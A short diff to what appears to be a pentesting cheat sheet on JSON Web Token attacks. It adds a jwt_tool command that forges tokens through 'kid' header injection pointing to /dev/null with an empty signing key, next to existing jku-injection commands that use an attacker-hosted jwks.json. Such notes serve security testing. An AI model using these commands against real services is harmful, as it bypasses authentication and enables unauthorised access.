@@ -94,6 +94,14 @@ $ jwt_tool 'jwt' -T -X i     # attack 'jwk header injection'
 
 The `jku` header contains a URL or a filename used to fetch a key.
 
+* When a symmetric algorithm such as HS is used:
+
+```shell!
+$ jwt_tool "" -I -hc kid -hv "/dev/null" -S hs512 -p "" -pc claim -pv value
+```
+
+* When a asymmetric algorithm such as RS is used:
+
 ```shell!
 $ cat $HOME/.jwt_tool/jwttool_custom_jwks.json # upload to URL as jwks.json
 $ jwt_tool -X s -ju "URL/jwks.json" -I -hc kid -hv jwt_tool -pc claim -pv value
